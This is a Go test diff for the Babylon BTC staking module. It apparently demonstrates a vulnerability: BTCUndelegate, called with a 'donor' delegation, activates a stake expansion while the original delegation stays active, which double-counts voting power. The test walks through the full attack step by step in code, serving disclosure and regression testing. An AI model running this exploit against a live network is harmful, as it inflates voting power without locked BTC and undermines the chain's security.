@@ -11,6 +11,8 @@ import (
 
 	sdkmath "cosmossdk.io/math"
 	"github.com/btcsuite/btcd/btcec/v2"
+	"github.com/btcsuite/btcd/btcec/v2/schnorr"
+	"github.com/btcsuite/btcd/btcutil"
 	"github.com/btcsuite/btcd/txscript"
 	"github.com/btcsuite/btcd/wire"
 	sdk "github.com/cosmos/cosmos-sdk/types"
@@ -21,6 +23,7 @@ import (
 	"google.golang.org/grpc/status"
 
 	appparams "github.com/babylonlabs-io/babylon/v4/app/params"
+	stk "github.com/babylonlabs-io/babylon/v4/btcstaking"
 	testutil "github.com/babylonlabs-io/babylon/v4/testutil/btcstaking-helper"
 	"github.com/babylonlabs-io/babylon/v4/testutil/datagen"
 	testutilevents "github.com/babylonlabs-io/babylon/v4/testutil/events"
@@ -1946,4 +1949,398 @@ func TestBtcStakeExpansionInvalidFundingValue(t *testing.T) {
 			require.EqualError(t, err, tc.expErr.Error())
 		})
 	}
+}
+
+// TestUndelegateBTCExpansionOutputMismatch demonstrates that MsgBTCUndelegate
+// does not verify which output of the expansion tx belongs to the delegation
+// identified by req.StakingTxHash. An attacker can:
+//
+//  1. Have an active delegation X.
+//  2. Construct a stake expansion B of X whose funding input (TxIn[1]) spends
+//     A's staking output — where A is a separate delegation created in
+//     pre-approval mode (no inclusion proof) AFTER the expansion is registered.
+//  3. Call MsgBTCUndelegate with StakingTxHash = A (the donor), passing B's
+//     expansion tx as the StakeSpendingTx.
+//
+// Because findInputIdx matches ANY input that spends A, and the stake-expansion
+// branch activates B via AddBTCDelegationInclusionProof without cross-checking
+// that A is B's actual previous delegation, the outcome is:
+//
+//   - B becomes ACTIVE (gains voting power)
+//   - A is marked UNBONDED
+//   - X remains ACTIVE (its staking output is spent on BTC, but Babylon never
+//     records its unbonding)
+//
+// Net effect: the finality provider's total voting power is X.TotalSat +
+// B.TotalSat, while only B.TotalSat worth of BTC is actually locked. X's sats
+// were consumed by B but the chain still counts them.
+func TestUndelegateBTCExpansionOutputMismatch(t *testing.T) {
+	r := rand.New(rand.NewSource(time.Now().Unix()))
+	ctrl := gomock.NewController(t)
+	defer ctrl.Finish()
+
+	btclcKeeper := types.NewMockBTCLightClientKeeper(ctrl)
+	btccKeeper := types.NewMockBtcCheckpointKeeper(ctrl)
+	h := testutil.NewHelper(t, btclcKeeper, btccKeeper, nil)
+
+	covenantSKs, _ := h.GenAndApplyParams(r)
+	bsParams := h.BTCStakingKeeper.GetParams(h.Ctx)
+	covPKs, err := bbn.NewBTCPKsFromBIP340PKs(bsParams.CovenantPks)
+	require.NoError(t, err)
+
+	var covenantPKsBtcec []*btcec.PublicKey
+	for _, pk := range bsParams.CovenantPks {
+		covenantPKsBtcec = append(covenantPKsBtcec, pk.MustToBTCPK())
+	}
+
+	_, fpPK, _ := h.CreateFinalityProvider(r)
+
+	delSK, _, err := datagen.GenRandomBTCKeyPair(r)
+	require.NoError(t, err)
+	fpBTCPK := bbn.NewBIP340PubKeyFromBTCPK(fpPK)
+
+	xStakingValue := int64(2 * 10e8)
+	stakingTime := uint16(1000)
+	lcTip := uint32(30)
+
+	// ----------------------------------------------------------------
+	// Step 1: Create delegation X — normal active delegation
+	// ----------------------------------------------------------------
+	xStakingTxHash, xMsgCreate, xDel, _, _, _, err := h.CreateDelegationWithBtcBlockHeight(
+		r, delSK, fpPK, xStakingValue,
+		stakingTime, 0, 0,
+		false, true, 10, lcTip,
+	)
+	require.NoError(t, err)
+	h.CreateCovenantSigs(r, covenantSKs, xMsgCreate, xDel, lcTip)
+	xDel, err = h.BTCStakingKeeper.GetBTCDelegation(h.Ctx, xStakingTxHash)
+	require.NoError(t, err)
+	xStatus, err := h.BTCStakingKeeper.BtcDelStatus(h.Ctx, xDel, bsParams.CovenantQuorum, lcTip)
+	require.NoError(t, err)
+	require.Equal(t, types.BTCDelegationStatus_ACTIVE, xStatus, "X must be active")
+
+	// ----------------------------------------------------------------
+	// Step 2: Construct A's staking tx locally (do NOT register in Babylon yet)
+	// ----------------------------------------------------------------
+	aStakingValue := int64(10000000) // 0.1 BTC
+	aStakingInfo := datagen.GenBTCStakingSlashingInfo(
+		r, t, h.Net,
+		delSK, []*btcec.PublicKey{fpPK}, covPKs,
+		bsParams.CovenantQuorum, stakingTime,
+		aStakingValue, bsParams.SlashingPkScript, bsParams.SlashingRate,
+		uint16(bsParams.UnbondingTimeBlocks),
+	)
+	aStakingTx := aStakingInfo.StakingTx
+	aStakingTxHash := aStakingTx.TxHash()
+	aStakingOutputIdx := uint32(0) // datagen.StakingOutIdx
+	aStakingOutput := aStakingTx.TxOut[aStakingOutputIdx]
+
+	// ----------------------------------------------------------------
+	// Step 3: Create stake expansion B of X, using A's staking tx as funding
+	//
+	// At this point A does not exist as a Babylon delegation, so the
+	// "funding output cannot be a staking output" check is bypassed
+	// (getBTCDelegation returns nil for A's tx hash).
+	// ----------------------------------------------------------------
+	xStkTxHash := xDel.MustGetStakingTxHash()
+	prevStakingOutPoint := wire.NewOutPoint(&xStkTxHash, xDel.StakingOutputIdx)
+	fundingOutPoint := wire.NewOutPoint(&aStakingTxHash, aStakingOutputIdx)
+	outPoints := []*wire.OutPoint{prevStakingOutPoint, fundingOutPoint}
+
+	bStakingValue := xStakingValue + aStakingValue - 1000 // leave room for fee in expansion
+	bStakingSlashingInfo := datagen.GenBTCStakingSlashingInfoWithInputsAndChange(
+		r, t, h.Net, outPoints,
+		delSK, []*btcec.PublicKey{fpPK}, covenantPKsBtcec,
+		bsParams.CovenantQuorum, stakingTime,
+		bStakingValue, bsParams.SlashingPkScript, bsParams.SlashingRate,
+		uint16(bsParams.UnbondingTimeBlocks),
+		0, // no change output — all value goes to the staking output + fee
+	)
+
+	serializedBStakingTx, err := bbn.SerializeBTCTx(bStakingSlashingInfo.StakingTx)
+	require.NoError(t, err)
+
+	bStkTxHash := bStakingSlashingInfo.StakingTx.TxHash()
+	bUnbondingValue := bStakingValue - int64(bsParams.UnbondingFeeSat)
+	bUnbondingSlashingInfo := datagen.GenBTCUnbondingSlashingInfo(
+		r, t, h.Net,
+		delSK, []*btcec.PublicKey{fpPK}, covPKs,
+		bsParams.CovenantQuorum,
+		wire.NewOutPoint(&bStkTxHash, datagen.StakingOutIdx),
+		uint16(bsParams.UnbondingTimeBlocks),
+		bUnbondingValue,
+		bsParams.SlashingPkScript, bsParams.SlashingRate,
+		uint16(bsParams.UnbondingTimeBlocks),
+	)
+	bUnbondingTxBytes, err := bbn.SerializeBTCTx(bUnbondingSlashingInfo.UnbondingTx)
+	require.NoError(t, err)
+	bDelSlashingTxSig, err := bUnbondingSlashingInfo.GenDelSlashingTxSig(delSK)
+	require.NoError(t, err)
+
+	bSlashingSpendInfo, err := bStakingSlashingInfo.StakingInfo.SlashingPathSpendInfo()
+	require.NoError(t, err)
+	bDelegatorSlashingSig, err := bStakingSlashingInfo.SlashingTx.Sign(
+		bStakingSlashingInfo.StakingTx, datagen.StakingOutIdx,
+		bSlashingSpendInfo.GetPkScriptPath(), delSK,
+	)
+	require.NoError(t, err)
+
+	stakerAddr := sdk.MustAccAddressFromBech32(xDel.StakerAddr)
+	pop, err := datagen.NewPoPBTC(stakerAddr, delSK)
+	require.NoError(t, err)
+	aFundingTxBz, err := bbn.SerializeBTCTx(aStakingTx)
+	require.NoError(t, err)
+
+	expandMsg := &types.MsgBtcStakeExpand{
+		StakerAddr:                    xDel.StakerAddr,
+		Pop:                           pop,
+		BtcPk:                         bbn.NewBIP340PubKeyFromBTCPK(delSK.PubKey()),
+		FpBtcPkList:                   []bbn.BIP340PubKey{*fpBTCPK},
+		StakingTime:                   uint32(stakingTime),
+		StakingValue:                  bStakingValue,
+		StakingTx:                     serializedBStakingTx,
+		SlashingTx:                    bStakingSlashingInfo.SlashingTx,
+		DelegatorSlashingSig:          bDelegatorSlashingSig,
+		UnbondingValue:                bUnbondingValue,
+		UnbondingTime:                 bsParams.UnbondingTimeBlocks,
+		UnbondingTx:                   bUnbondingTxBytes,
+		UnbondingSlashingTx:           bUnbondingSlashingInfo.SlashingTx,
+		DelegatorUnbondingSlashingSig: bDelSlashingTxSig,
+		PreviousStakingTxHash:         xStkTxHash.String(),
+		FundingTx:                     aFundingTxBz,
+	}
+
+	h.BTCLightClientKeeper.EXPECT().GetTipInfo(gomock.Eq(h.Ctx)).Return(&btclctypes.BTCHeaderInfo{Height: lcTip}).MaxTimes(3)
+	_, err = h.MsgServer.BtcStakeExpand(h.Ctx, expandMsg)
+	require.NoError(t, err, "stake expansion B should be created successfully — A is not yet a delegation so funding check is bypassed")
+
+	bDel, err := h.BTCStakingKeeper.GetBTCDelegation(h.Ctx, bStakingSlashingInfo.StakingTx.TxHash().String())
+	require.NoError(t, err)
+	require.True(t, bDel.IsStakeExpansion(), "B must be a stake expansion")
+
+	// ----------------------------------------------------------------
+	// Step 4: Register delegation A in Babylon (pre-approval, no inclusion proof)
+	//
+	// A will be in PENDING state. Even when BTC tip flies past A's timelock,
+	// A won't be EXPIRED because HasInclusionProof() == false.
+	// ----------------------------------------------------------------
+	aUnbondingValue := aStakingValue - 1000
+	aStkTxHash := aStakingTx.TxHash()
+	aUnbondingSlashingInfo := datagen.GenBTCUnbondingSlashingInfo(
+		r, t, h.Net,
+		delSK, []*btcec.PublicKey{fpPK}, covPKs,
+		bsParams.CovenantQuorum,
+		wire.NewOutPoint(&aStkTxHash, aStakingOutputIdx),
+		uint16(bsParams.UnbondingTimeBlocks),
+		aUnbondingValue,
+		bsParams.SlashingPkScript, bsParams.SlashingRate,
+		uint16(bsParams.UnbondingTimeBlocks),
+	)
+	aUnbondingTxBytes, err := bbn.SerializeBTCTx(aUnbondingSlashingInfo.UnbondingTx)
+	require.NoError(t, err)
+	aDelSlashingSig, err := aUnbondingSlashingInfo.GenDelSlashingTxSig(delSK)
+	require.NoError(t, err)
+
+	aSlashingSpendInfo, err := aStakingInfo.StakingInfo.SlashingPathSpendInfo()
+	require.NoError(t, err)
+	aDelegatorSlashingSig, err := aStakingInfo.SlashingTx.Sign(
+		aStakingTx, datagen.StakingOutIdx,
+		aSlashingSpendInfo.GetPkScriptPath(), delSK,
+	)
+	require.NoError(t, err)
+
+	stPk := bbn.NewBIP340PubKeyFromBTCPK(delSK.PubKey())
+
+	// Build headers for A (we need them for the mock even though we won't use the inclusion proof)
+	prevBlockA, _ := datagen.GenRandomBtcdBlock(r, 0, nil)
+	btcHeaderWithProofA := datagen.CreateBlockWithTransaction(r, &prevBlockA.Header, aStakingTx)
+	btcHeaderA := btcHeaderWithProofA.HeaderBytes
+	btcHeaderInfoA := &btclctypes.BTCHeaderInfo{Header: &btcHeaderA, Height: 10}
+	h.BTCLightClientKeeper.EXPECT().GetHeaderByHash(gomock.Eq(h.Ctx), gomock.Eq(btcHeaderA.Hash())).Return(btcHeaderInfoA, nil).AnyTimes()
+
+	// Unbonding tx inclusion proof for A
+	prevBlockForAUnbonding, _ := datagen.GenRandomBtcdBlock(r, 0, nil)
+	btcAUnbondingHeaderWithProof := datagen.CreateBlockWithTransaction(r, &prevBlockForAUnbonding.Header, aUnbondingSlashingInfo.UnbondingTx)
+	btcAUnbondingHeader := btcAUnbondingHeaderWithProof.HeaderBytes
+	btcAUnbondingHeaderInfo := &btclctypes.BTCHeaderInfo{Header: &btcAUnbondingHeader, Height: 11}
+	h.BTCLightClientKeeper.EXPECT().GetHeaderByHash(gomock.Eq(h.Ctx), gomock.Eq(btcAUnbondingHeader.Hash())).Return(btcAUnbondingHeaderInfo, nil).AnyTimes()
+
+	msgCreateA := &types.MsgCreateBTCDelegation{
+		StakerAddr:                    xDel.StakerAddr,
+		BtcPk:                         stPk,
+		FpBtcPkList:                   []bbn.BIP340PubKey{*fpBTCPK},
+		Pop:                           pop,
+		StakingTime:                   uint32(stakingTime),
+		StakingValue:                  aStakingValue,
+		StakingTx:                     aFundingTxBz, // same bytes as serialized A staking tx
+		SlashingTx:                    aStakingInfo.SlashingTx,
+		DelegatorSlashingSig:          aDelegatorSlashingSig,
+		UnbondingTx:                   aUnbondingTxBytes,
+		UnbondingTime:                 bsParams.UnbondingTimeBlocks,
+		UnbondingValue:                aUnbondingValue,
+		UnbondingSlashingTx:           aUnbondingSlashingInfo.SlashingTx,
+		DelegatorUnbondingSlashingSig: aDelSlashingSig,
+		// NO StakingTxInclusionProof → pre-approval
+	}
+	h.BTCStakingKeeper.IndexAllowedStakingTransaction(h.Ctx, &aStkTxHash)
+	h.BTCLightClientKeeper.EXPECT().GetTipInfo(gomock.Eq(h.Ctx)).Return(&btclctypes.BTCHeaderInfo{Height: lcTip})
+	_, err = h.MsgServer.CreateBTCDelegation(h.Ctx, msgCreateA)
+	require.NoError(t, err, "delegation A should be created in pre-approval mode")
+
+	aDel, err := h.BTCStakingKeeper.GetBTCDelegation(h.Ctx, aStakingTxHash.String())
+	require.NoError(t, err)
+	require.False(t, aDel.HasInclusionProof(), "A must NOT have an inclusion proof")
+	aStatus, err := h.BTCStakingKeeper.BtcDelStatus(h.Ctx, aDel, bsParams.CovenantQuorum, lcTip)
+	require.NoError(t, err)
+	require.Equal(t, types.BTCDelegationStatus_PENDING, aStatus, "A should be PENDING (no covenant sigs)")
+
+	// ----------------------------------------------------------------
+	// Step 5: Add covenant signatures to B → VERIFIED
+	// ----------------------------------------------------------------
+	h.CreateCovenantSigs(r, covenantSKs, nil, bDel, lcTip)
+	bDel, err = h.BTCStakingKeeper.GetBTCDelegation(h.Ctx, bStakingSlashingInfo.StakingTx.TxHash().String())
+	require.NoError(t, err)
+	bStatus, err := h.BTCStakingKeeper.BtcDelStatus(h.Ctx, bDel, bsParams.CovenantQuorum, lcTip)
+	require.NoError(t, err)
+	require.Equal(t, types.BTCDelegationStatus_VERIFIED, bStatus, "B should be VERIFIED (has quorum, no inclusion proof)")
+
+	// ----------------------------------------------------------------
+	// Step 6: Build the expansion tx witness
+	//
+	// TxIn[0]: unbonding-path spend of X's staking output (covenant+staker)
+	// TxIn[1]: timelock-path spend of A's staking output (staker only)
+	// ----------------------------------------------------------------
+	xStkTx := xDel.MustGetStakingTx()
+	xStakingOutput := xStkTx.TxOut[xDel.StakingOutputIdx]
+	spendingTx := bStakingSlashingInfo.StakingTx
+
+	// Build X's staking info to get unbonding-path witness for TxIn[0]
+	xStakingInfoRebuilt, err := stk.BuildStakingInfo(
+		delSK.PubKey(), []*btcec.PublicKey{fpPK}, covenantPKsBtcec,
+		bsParams.CovenantQuorum, stakingTime,
+		btcutil.Amount(xStakingValue), h.Net,
+	)
+	require.NoError(t, err)
+	require.Equal(t, xStakingOutput, xStakingInfoRebuilt.StakingOutput, "rebuilt X staking output must match")
+
+	xUnbondingSpendInfo, err := xStakingInfoRebuilt.UnbondingPathSpendInfo()
+	require.NoError(t, err)
+
+	// Covenant sigs on expansion TxIn[0] (they sign the unbonding-path of X)
+	covExpSigs := datagen.GenerateSignaturesForStakeExpansion(
+		t, covenantSKs, spendingTx,
+		xStakingOutput, aStakingOutput,
+		xUnbondingSpendInfo.RevealedLeaf,
+	)
+
+	stakerSigOnInput0, err := stk.SignTxForFirstScriptSpendWithTwoInputsFromTapLeaf(
+		spendingTx, xStakingOutput, aStakingOutput,
+		delSK, xUnbondingSpendInfo.RevealedLeaf,
+	)
+	require.NoError(t, err)
+
+	input0Witness, err := xUnbondingSpendInfo.CreateUnbondingPathWitness(covExpSigs, stakerSigOnInput0)
+	require.NoError(t, err)
+	spendingTx.TxIn[0].Witness = input0Witness
+
+	// Build A's staking info to get timelock-path witness for TxIn[1]
+	aStakingInfoRebuilt, err := stk.BuildStakingInfo(
+		delSK.PubKey(), []*btcec.PublicKey{fpPK}, covenantPKsBtcec,
+		bsParams.CovenantQuorum, stakingTime,
+		btcutil.Amount(aStakingValue), h.Net,
+	)
+	require.NoError(t, err)
+	require.Equal(t, aStakingOutput, aStakingInfoRebuilt.StakingOutput, "rebuilt A staking output must match")
+
+	aTimelockSpendInfo, err := aStakingInfoRebuilt.TimeLockPathSpendInfo()
+	require.NoError(t, err)
+
+	// Sign TxIn[1] via tapscript (need both prevouts for sighash)
+	prevOutFetcher := txscript.NewMultiPrevOutFetcher(map[wire.OutPoint]*wire.TxOut{
+		spendingTx.TxIn[0].PreviousOutPoint: xStakingOutput,
+		spendingTx.TxIn[1].PreviousOutPoint: aStakingOutput,
+	})
+	sigHashes := txscript.NewTxSigHashes(spendingTx, prevOutFetcher)
+	rawSig, err := txscript.RawTxInTapscriptSignature(
+		spendingTx, sigHashes, 1,
+		aStakingOutput.Value, aStakingOutput.PkScript,
+		txscript.NewBaseTapLeaf(aTimelockSpendInfo.GetPkScriptPath()),
+		txscript.SigHashDefault, delSK,
+	)
+	require.NoError(t, err)
+
+	parsedSig, err := schnorr.ParseSignature(rawSig)
+	require.NoError(t, err)
+	input1Witness, err := aTimelockSpendInfo.CreateTimeLockPathWitness(parsedSig)
+	require.NoError(t, err)
+	spendingTx.TxIn[1].Witness = input1Witness
+
+	spendingTxWithWitnessBz, err := bbn.SerializeBTCTx(spendingTx)
+	require.NoError(t, err)
+
+	// ----------------------------------------------------------------
+	// Step 7: Build inclusion proof for the expansion tx
+	// ----------------------------------------------------------------
+	expansionTxInclusionProof := h.BuildBTCInclusionProofForSpendingTx(r, spendingTx, lcTip)
+
+	// ----------------------------------------------------------------
+	// Step 8: Call MsgBTCUndelegate with StakingTxHash = A (the donor)
+	//
+	// The handler will:
+	//  - Look up A → status PENDING → passes the !UNBONDED && !EXPIRED guard
+	//  - Find B by spendStakeTxHash → isStakeExpansion = true
+	//  - AddBTCDelegationInclusionProof for B → B becomes ACTIVE
+	//  - findInputIdx matches TxIn[1] (A's staking output) → idx 1
+	//  - VerifySpendStakeTxStakerSig checks witness on TxIn[1] → valid
+	//  - btcUndelegate marks A as UNBONDED
+	//  - X is NEVER touched
+	// ----------------------------------------------------------------
+	undelegateMsg := &types.MsgBTCUndelegate{
+		Signer:                        xDel.StakerAddr,
+		StakingTxHash:                 aStakingTxHash.String(),
+		StakeSpendingTx:               spendingTxWithWitnessBz,
+		StakeSpendingTxInclusionProof: expansionTxInclusionProof,
+		FundingTransactions:           [][]byte{xDel.StakingTx, aFundingTxBz},
+	}
+
+	lcTip += 11
+	h.BTCLightClientKeeper.EXPECT().GetTipInfo(gomock.Eq(h.Ctx)).Return(&btclctypes.BTCHeaderInfo{Height: lcTip}).AnyTimes()
+	_, err = h.MsgServer.BTCUndelegate(h.Ctx, undelegateMsg)
+	require.NoError(t, err, "BTCUndelegate should succeed — this is the bug: the handler does not verify which input corresponds to A vs X")
+
+	// ----------------------------------------------------------------
+	// Step 9: Verify the exploit outcome
+	// ----------------------------------------------------------------
+
+	// B should now be ACTIVE
+	bDel, err = h.BTCStakingKeeper.GetBTCDelegation(h.Ctx, bStakingSlashingInfo.StakingTx.TxHash().String())
+	require.NoError(t, err)
+	bStatus, err = h.BTCStakingKeeper.BtcDelStatus(h.Ctx, bDel, bsParams.CovenantQuorum, lcTip)
+	require.NoError(t, err)
+	require.Equal(t, types.BTCDelegationStatus_ACTIVE, bStatus,
+		"B must be ACTIVE — the expansion was activated through the donor delegation A")
+
+	// A should be UNBONDED
+	aDel, err = h.BTCStakingKeeper.GetBTCDelegation(h.Ctx, aStakingTxHash.String())
+	require.NoError(t, err)
+	require.True(t, aDel.IsUnbondedEarly(),
+		"A must be marked as early-unbonded")
+
+	// X should STILL be ACTIVE — this is the bug
+	xDel, err = h.BTCStakingKeeper.GetBTCDelegation(h.Ctx, xStakingTxHash)
+	require.NoError(t, err)
+	xStatus, err = h.BTCStakingKeeper.BtcDelStatus(h.Ctx, xDel, bsParams.CovenantQuorum, lcTip)
+	require.NoError(t, err)
+	require.Equal(t, types.BTCDelegationStatus_ACTIVE, xStatus,
+		"BUG: X is still ACTIVE even though its staking output was consumed by expansion B. "+
+			"The chain never recorded X's unbonding because BTCUndelegate was called with A as the donor. "+
+			"Voting power is now X.TotalSat + B.TotalSat instead of just B.TotalSat.")
+
+	// Confirm the voting power double-count
+	xVP := xDel.VotingPower(lcTip, bsParams.CovenantQuorum, 0)
+	bVP := bDel.VotingPower(lcTip, bsParams.CovenantQuorum, bsParams.CovenantQuorum)
+	require.Greater(t, xVP, uint64(0), "X still has voting power")
+	require.Greater(t, bVP, uint64(0), "B has voting power")
+	t.Logf("EXPLOIT: X voting power = %d, B voting power = %d, total = %d (should be only %d)",
+		xVP, bVP, xVP+bVP, bVP)
 }
